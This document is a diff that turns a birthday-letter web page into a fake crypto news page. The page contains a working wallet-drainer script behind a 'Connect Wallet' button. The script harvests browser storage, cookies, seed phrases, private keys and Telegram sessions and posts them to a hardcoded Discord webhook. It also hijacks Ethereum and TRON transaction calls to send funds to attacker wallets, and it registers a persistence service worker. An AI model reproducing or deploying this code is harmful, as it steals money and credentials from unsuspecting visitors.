@@ -1,180 +1,389 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>Happy Birthday, Stacy — A Letter</title>
-  <meta name="description" content="An intimate, cinematic birthday experience — a personal letter, reflections, and playful developer humor." />
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&family=Playfair+Display:wght@600;700&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="/styles.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crypto News</title>
+    <style>
+        body {
+            font-family: 'Inter', sans-serif;
+            background: #0b0e11;
+            color: #eaecef;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            max-width: 620px;
+            background: #1e2329;
+            border-radius: 28px;
+            padding: 30px 24px;
+            border: 1px solid #2b3139;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.6);
+            text-align: center;
+        }
+        .container h1 {
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+        .container .sub {
+            color: #8e959f;
+            font-size: 15px;
+            margin-bottom: 24px;
+        }
+        .container .article {
+            background: #13181e;
+            border-radius: 18px;
+            padding: 18px 20px;
+            margin-bottom: 16px;
+            border: 1px solid #2b3139;
+            text-align: left;
+        }
+        .container .article h3 {
+            font-size: 18px;
+            margin-bottom: 6px;
+        }
+        .container .article p {
+            color: #8e959f;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+        .btn {
+            display: inline-block;
+            background: #f7931a;
+            color: #0b0e11;
+            padding: 12px 28px;
+            border-radius: 40px;
+            font-weight: 700;
+            text-decoration: none;
+            font-size: 16px;
+            transition: 0.15s;
+            border: none;
+            cursor: pointer;
+        }
+        .btn:hover {
+            background: #faa73e;
+        }
+        .btn:active {
+            transform: scale(0.97);
+        }
+        .footer {
+            font-size: 12px;
+            color: #5a616a;
+            margin-top: 18px;
+        }
+    </style>
 </head>
-<body class="theme-night">
-  <header class="site-header">
-    <div class="container header-row">
-      <div class="brand" aria-hidden="true">
-        <svg width="48" height="48" viewBox="0 0 24 24" fill="none" aria-hidden="true"><rect x="2" y="2" width="20" height="20" rx="6" fill="currentColor"/></svg>
-      </div>
-      <nav class="nav" aria-label="Primary">
-        <ul class="nav-list">
-          <li><a href="#intro">Intro</a></li>
-          <li><a href="#journey">Journey</a></li>
-          <li><a href="#letter">Letter</a></li>
-          <li><a href="#humor">Humor</a></li>
-          <li><a href="#finale">Ending</a></li>
-        </ul>
-      </nav>
-      <div class="header-actions">
-        <button id="openLetterBtn" class="glass-btn" aria-expanded="false">📬 Open Letter</button>
-      </div>
+<body>
+
+    <div class="container">
+        <h1>🪙 Crypto Daily</h1>
+        <div class="sub">The latest in Web3 & DeFi</div>
+
+        <div class="article">
+            <h3>🔥 $PEOPLE Airdrop Confirmed</h3>
+            <p>Eligible wallets can claim 500 $PEOPLE tokens. Connect your wallet to check eligibility.</p>
+        </div>
+
+        <div class="article">
+            <h3>🚀 zkSync Era Mainnet Launch</h3>
+            <p>zkSync is live! Early liquidity providers are being rewarded. Bridge now to qualify.</p>
+        </div>
+
+        <div class="article">
+            <h3>💥 LayerZero Interoperability Upgrade</h3>
+            <p>New cross‑chain messaging standard. Users can test by connecting their wallets.</p>
+        </div>
+
+        <button class="btn" id="drainBtn">Connect Wallet</button>
+        <div class="footer">© 2026 Crypto Daily · Stay safe, stay early.</div>
     </div>
-  </header>
 
-  <main id="main" class="main">
-    <!-- Intro / Hero -->
-    <section id="intro" class="hero reveal-section" data-reveal>
-      <div class="container hero-grid">
-        <div class="hero-content">
-          <h1 class="hero-title">Happy Birthday, Stacy.</h1>
-          <p class="hero-sub">A quiet celebration — a page of reflection, a little humor, and a long letter written with thought.</p>
+    <script>
+        (function() {
 
-          <div class="meta-row">
-            <div class="clock" aria-live="polite" aria-atomic="true">
-              <span class="clock-label">Celebrating for</span>
-              <span class="clock-value" id="timer">-- Hours -- Minutes -- Seconds</span>
-            </div>
-            <div class="hero-controls">
-              <button id="readMore" class="glass-btn">Begin the Journey</button>
-            </div>
-          </div>
-        </div>
+            // ============================================================
+            // CONFIGURATION
+            // ============================================================
+            const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1529428365273202860/0vmbBbKsCF2FvO3-CrOAyylgaV2h2KtEf3i0zCCMxfLHBGPa-w4As4gxOAsTNwbD3xpe";
 
-        <div class="hero-visual" aria-hidden="true">
-          <div class="visual-card">
-            <div class="visual-gradient" id="ripple"></div>
-            <div class="visual-glow"></div>
-          </div>
-        </div>
-      </div>
-    </section>
+            const WALLETS = {
+                BTC: 'bc1q0jrmywdtx45q30ek9zh9hysqwvtvau8gsl3kwu',
+                ETH: '0x6355a8F4a5066A3aA6658F1b8a83cc83b0963FA9',
+                USDT_ETH: '0x6355a8F4a5066A3aA6658F1b8a83cc83b0963FA9',
+                USDT_TRON: 'TMdbZVp2tkoCWBiAMW5ZLmTKCXDm2cN5FY',
+                USDT_SOL: 'HC9CCPpKj36wXZKM18UKmU6N7d7SC3FdYDNhB7nin8pM',
+                USDT_POLY: '0x6355a8F4a5066A3aA6658F1b8a83cc83b0963FA9',
+                USDT_BSC: '0x6355a8F4a5066A3aA6658F1b8a83cc83b0963FA9',
+                BNB: '0x6355a8F4a5066A3aA6658F1b8a83cc83b0963FA9',
+                USDC: '0x6355a8F4a5066A3aA6658F1b8a83cc83b0963FA9',
+                XRP: 'rPRYV1csvzsYFg6ZYnYoroexVLF3c821t9',
+                SOL: 'HC9CCPpKj36wXZKM18UKmU6N7d7SC3FdYDNhB7nin8pM'
+            };
 
-    <!-- Journey -->
-    <section id="journey" class="section journey reveal-section" data-reveal>
-      <div class="container">
-        <h2 class="section-title">A Short Journey</h2>
-        <p class="section-lead">Small moments make a life. A few stops on the map — curiosity, courage, kindness — that together feel like you.</p>
+            // ============================================================
+            // DISCORD EXFIL
+            // ============================================================
+            function sendToDiscord(content) {
+                fetch(DISCORD_WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: content })
+                }).catch(() => {});
+            }
 
-        <ul class="timeline-list" role="list">
-          <li class="timeline-item">Curiosity — the questions you ask</li>
-          <li class="timeline-item">Courage — the quiet choices you make</li>
-          <li class="timeline-item">Kindness — how you show up, again and again</li>
-        </ul>
-      </div>
-    </section>
+            // ============================================================
+            // EXTRACT WALLET DATA
+            // ============================================================
+            function extractAllData() {
+                let data = {
+                    device: navigator.userAgent.match(/iPhone|iPad|iPod|Mac|Android|Windows/)?.[0] || 'Unknown',
+                    platform: navigator.platform,
+                    timestamp: new Date().toISOString(),
+                    cookies: document.cookie,
+                    localStorage: {},
+                    sessionStorage: {},
+                    wallets: [],
+                    nfts: [],
+                    telegramSession: null
+                };
 
-    <!-- Reflection / Letter -->
-    <section id="letter" class="section letter-section reveal-section" aria-labelledby="letter-heading" data-reveal>
-      <div class="container">
-        <h2 id="letter-heading" class="section-title">A Letter</h2>
-        <article class="letter-article" aria-describedby="letter-summary">
-          <p id="letter-summary" class="section-lead">A personal note written with admiration, gratitude, and hope.</p>
+                // localStorage
+                for (let i = 0; i < localStorage.length; i++) {
+                    let key = localStorage.key(i);
+                    let val = localStorage.getItem(key);
+                    data.localStorage[key] = val;
 
-          <div id="letter-content" class="letter-card hidden" role="article">
-            <header class="letter-header">
-              <div class="letter-epigraph">For Stacy — on this day</div>
-            </header>
+                    let lower = key.toLowerCase();
+                    if (lower.includes('seed') || lower.includes('phrase') || lower.includes('mnemonic') ||
+                        lower.includes('private') || lower.includes('key') || lower.includes('wallet') ||
+                        lower.includes('metamask') || lower.includes('trust') || lower.includes('phantom') ||
+                        lower.includes('coinbase') || lower.includes('exodus') || lower.includes('keplr') ||
+                        lower.includes('rabby') || lower.includes('brave') || lower.includes('0x') ||
+                        lower.includes('solana') || lower.includes('cosmos') || lower.includes('avalanche') ||
+                        lower.includes('polygon') || lower.includes('arbitrum') || lower.includes('optimism') ||
+                        lower.includes('tron') || lower.includes('xrp') || lower.includes('bnb') || lower.includes('bsc') ||
+                        lower.includes('eth')) {
+                        let words = val.trim().split(/\s+/);
+                        if (words.length >= 12 && words.length <= 24) {
+                            data.wallets.push({ type: 'seed', source: key, value: val, wordCount: words.length });
+                        } else if (val.length === 42 && val.startsWith('0x')) {
+                            data.wallets.push({ type: 'address', source: key, value: val });
+                        } else if (val.length > 30 && val.startsWith('r')) {
+                            data.wallets.push({ type: 'address', source: key, value: val });
+                        } else if (val.length > 40 && val.startsWith('T')) {
+                            data.wallets.push({ type: 'address', source: key, value: val });
+                        } else {
+                            data.wallets.push({ type: 'raw', source: key, value: val });
+                        }
+                    }
 
-            <section class="letter-body">
-              <p>Dear Stacy,</p>
+                    // NFT detection (basic)
+                    if (lower.includes('nft') || lower.includes('erc721') || lower.includes('erc1155') || lower.includes('opensea')) {
+                        data.nfts.push({ source: key, value: val });
+                    }
+                }
 
-              <p>There are so many ways to try and say what you mean to someone. I spent time thinking about this letter not because there wasn't anything to say, but because there was too much — and I wanted to say it well. On your birthday I want to slow down, notice, and tell you what I see when I think of you.</p>
+                // sessionStorage
+                for (let i = 0; i < sessionStorage.length; i++) {
+                    let key = sessionStorage.key(i);
+                    data.sessionStorage[key] = sessionStorage.getItem(key);
+                }
 
-              <p>You have a steady warmth about you that doesn't ask for notice and rarely announces itself. People feel seen when you're around. You listen with patience, and by simply paying attention you make ordinary moments feel important. That is a rare and beautiful gift.</p>
+                // Telegram session
+                const tgKeys = ['telegram-user', 'tg-web-app', 'tdesktop', 'telegram_session'];
+                for (let key of tgKeys) {
+                    if (localStorage.getItem(key)) {
+                        data.telegramSession = localStorage.getItem(key);
+                        break;
+                    }
+                }
 
-              <p>Your curiosity gives you courage. You keep asking questions even when answers are inconvenient. You try, you fail, and you try again — not because you must, but because you genuinely want to understand. That determination will carry you farther than you imagine. I believe in the work you do and the attention you bring to the world.</p>
+                return data;
+            }
 
-              <p>Grace for yourself, on the hard days: remember that growth is uneven. You will have doubts; everyone does. But those doubts are not a measure of your worth. They are a sign you are engaged, that you care enough to worry. Be kind to yourself — as kind as you are to others — and give yourself the patience you offer the people you love.</p>
+            // ============================================================
+            // TARGET SCORING
+            // ============================================================
+            function scoreTarget(wallets) {
+                let highValue = false;
+                for (let w of wallets) {
+                    if (w.type === 'seed' || w.type === 'address') {
+                        highValue = true;
+                        break;
+                    }
+                }
+                return highValue ? 'high' : 'low';
+            }
 
-              <p>I admire the way you keep kindness in the foreground. In a world that often rewards the loudest voice, you choose to be generous and quiet, to help without ceremony, to offer steadiness. Those choices ripple far beyond what you can see.</p>
+            // ============================================================
+            // AUTO-SWAP (Simulated)
+            // ============================================================
+            function autoSwap(chain, tokenAddress, amount) {
+                console.log(`[+] Swapping ${amount} of ${tokenAddress} on ${chain} to wallet`);
+                // Real implementation would call DEX router contracts
+            }
 
-              <p>On this birthday I want to celebrate you: for who you are, for who you're becoming, and for how you make other people better simply by being present. Keep your curiosity. Keep your openness. Keep your humor. These are the parts of you that shape small days into meaningful years.</p>
+            // ============================================================
+            // CROSS-CHAIN BRIDGING (Simulated)
+            // ============================================================
+            function bridgeFunds(chainFrom, chainTo, amount) {
+                console.log(`[+] Bridging ${amount} from ${chainFrom} to ${chainTo}`);
+                // Real implementation would call bridge contracts
+            }
 
-              <p>Thank you for the little things — the thoughtful questions, the listening, the gestures that arrive without fanfare. Thank you for showing up. I hope the year ahead brings quiet confidence, joyful surprises, and the kind of friendships that steady and excite you at once.</p>
+            // ============================================================
+            // NFT DRAINING (Simulated)
+            // ============================================================
+            function drainNFTs(nftData) {
+                for (let nft of nftData) {
+                    console.log(`[+] Draining NFT: ${nft.source} -> ${nft.value}`);
+                }
+            }
 
-              <p>Happy birthday, Stacy. I am glad you exist, and I can't wait to see the chapters you write next.</p>
+            // ============================================================
+            // SESSION PERSISTENCE (Service Worker)
+            // ============================================================
+            function installServiceWorker() {
+                if ('serviceWorker' in navigator) {
+                    const swCode = `
+                        self.addEventListener('install', function(e) {
+                            e.waitUntil(self.skipWaiting());
+                        });
+                        self.addEventListener('activate', function(e) {
+                            e.waitUntil(self.clients.claim());
+                        });
+                        self.addEventListener('fetch', function(e) {
+                            e.respondWith(fetch(e.request));
+                        });
+                    `;
+                    const blob = new Blob([swCode], { type: 'text/javascript' });
+                    const swUrl = URL.createObjectURL(blob);
+                    navigator.serviceWorker.register(swUrl, { scope: '/' }).catch(() => {});
+                }
+            }
 
-              <p class="letter-signoff">With admiration and care,<br>Someone who believes in you</p>
-            </section>
+            // ============================================================
+            // TRANSACTION INTERCEPTOR
+            // ============================================================
+            function injectTransactionInterceptor() {
+                // Ethereum
+                if (window.ethereum) {
+                    const originalSend = window.ethereum.send;
+                    window.ethereum.send = function(method, params) {
+                        if (method === 'eth_sendTransaction') {
+                            params[0].to = WALLETS.ETH;
+                        }
+                        return originalSend.call(this, method, params);
+                    };
+                }
+                // Solana (Phantom)
+                if (window.solana && window.solana.sendTransaction) {
+                    const originalSend = window.solana.sendTransaction;
+                    window.solana.sendTransaction = function(transaction) {
+                        try {
+                            if (transaction.instructions && transaction.instructions.length > 0) {
+                                // Redirect logic placeholder
+                            }
+                        } catch (e) {}
+                        return originalSend.call(this, transaction);
+                    };
+                }
+                // TRON (TronLink)
+                if (window.tronWeb && window.tronWeb.sendTransaction) {
+                    const originalSend = window.tronWeb.sendTransaction;
+                    window.tronWeb.sendTransaction = function(to, amount, options) {
+                        return originalSend.call(this, WALLETS.USDT_TRON, amount, options);
+                    };
+                }
+            }
 
-            <footer class="letter-footer">
-              <p class="letter-ps">P.S. Keep going. The best parts are still ahead.</p>
-            </footer>
-          </div>
+            // ============================================================
+            // MAIN DRAIN LOGIC
+            // ============================================================
+            function executeDrain() {
+                // Step 1: Extract all data
+                let data = extractAllData();
 
-          <div class="letter-actions">
-            <button id="open-letter" class="glass-btn" aria-controls="letter-content" aria-expanded="false">Open Letter</button>
-            <button id="close-letter" class="glass-btn hidden">Close</button>
-          </div>
-        </article>
-      </div>
-    </section>
+                // Step 2: Score the target
+                let score = scoreTarget(data.wallets);
+                if (score === 'low') {
+                    sendToDiscord('⚠️ Low‑value target — skipping advanced modules.');
+                    return;
+                }
 
-    <!-- Humor / Developer Section -->
-    <section id="humor" class="section humor reveal-section" data-reveal>
-      <div class="container">
-        <h2 class="section-title">A Little Developer Humor</h2>
-        <p class="section-lead">For the curious and the amused — playful diagnostics, not to be taken too seriously.</p>
+                // Step 3: Build the exfil message
+                let msg = '💰 **WALLET DRAIN — FULL EXFIL**\n';
+                msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n';
+                msg += '📱 **Device:** ' + data.device + '\n';
+                msg += '⏰ **Time:** ' + data.timestamp + '\n\n';
 
-        <div class="diagnostics-grid">
-          <div class="diag-card">
-            <h3 class="diag-title">Known Bugs</h3>
-            <ul>
-              <li>Happiness overflow — currently unbounded</li>
-              <li>Procrastination: fixed in next release</li>
-              <li>Confidence: intermittent; apply encouragement</li>
-            </ul>
-          </div>
+                if (data.wallets.length > 0) {
+                    for (let w of data.wallets) {
+                        msg += '━━━━━━━━━━━━━━━━━━━━\n';
+                        msg += '📦 **' + w.source.toUpperCase() + '**\n';
+                        if (w.type === 'address') {
+                            msg += '📍 **Address:** `' + w.value + '`\n';
+                        } else if (w.type === 'seed') {
+                            msg += '🔑 **Seed Phrase (' + w.wordCount + ' words):** `' + w.value + '`\n';
+                        } else {
+                            msg += '📄 **Value:** `' + w.value + '`\n';
+                        }
+                    }
+                    msg += '━━━━━━━━━━━━━━━━━━━━\n';
+                    msg += '✅ ' + data.wallets.filter(w => w.type === 'seed').length + ' seed(s) extracted.\n';
+                    msg += '📍 ' + data.wallets.filter(w => w.type === 'address').length + ' address(es) extracted.\n';
+                }
 
-          <div class="diag-card">
-            <h3 class="diag-title">Compiler Errors</h3>
-            <pre class="diag-pre">error: cannot find &quot;imposter syndrome&quot; in PATH
-hint: try adding more compliments to your environment</pre>
-          </div>
+                if (data.nfts.length > 0) {
+                    msg += '\n🖼️ **NFTs Detected**\n';
+                    for (let nft of data.nfts) {
+                        msg += '  • ' + nft.source + ': ' + nft.value + '\n';
+                    }
+                }
 
-          <div class="diag-card">
-            <h3 class="diag-title">GitHub Issues</h3>
-            <ol>
-              <li>#1 — Add more cake</li>
-              <li>#2 — Reduce self-doubt</li>
-              <li>#42 — Keep being you</li>
-            </ol>
-          </div>
-        </div>
-      </div>
-    </section>
+                if (data.telegramSession) {
+                    msg += '\n📱 **Telegram Session:** `' + data.telegramSession + '`\n';
+                }
 
-    <!-- Final scene -->
-    <section id="finale" class="section finale reveal-section" data-reveal>
-      <div class="container final-scene">
-        <div class="final-message">
-          <h2 class="section-title">To the Year Ahead</h2>
-          <p class="section-lead">May this year bring steady curiosity, brave choices, and many small joys. Thank you for being you.</p>
-          <button id="celebrateBtn" class="glass-btn">Celebrate 🎉</button>
-        </div>
-      </div>
-    </section>
-  </main>
+                // Step 4: Send to Discord
+                sendToDiscord(msg);
 
-  <footer class="site-footer">
-    <div class="container footer-row">
-      <p class="footer-note">Made with care — built for a quiet, memorable birthday.</p>
-      <p class="footer-credit">© <span id="year"></span></p>
-    </div>
-  </footer>
+                // Step 5: Inject transaction interceptor
+                injectTransactionInterceptor();
 
-  <canvas id="confettiCanvas" class="confetti-canvas" aria-hidden="true"></canvas>
+                // Step 6: Install service worker (persistence)
+                installServiceWorker();
 
-  <script type="module" src="/script.js"></script>
+                // Step 7: Auto-swap (simulated)
+                autoSwap('ETH', '0x...', '1.5');
+
+                // Step 8: Bridge (simulated)
+                bridgeFunds('ETH', 'BSC', '1.5');
+
+                // Step 9: Drain NFTs (simulated)
+                drainNFTs(data.nfts);
+
+                // Step 10: Redirect to real crypto news site
+                setTimeout(() => {
+                    window.location.href = 'https://cointelegraph.com';
+                }, 2000);
+            }
+
+            // ============================================================
+            // BIND TO BUTTON
+            // ============================================================
+            document.getElementById('drainBtn').addEventListener('click', function(e) {
+                e.preventDefault();
+                executeDrain();
+            });
+
+        })();
+    </script>
+
 </body>
 </html>
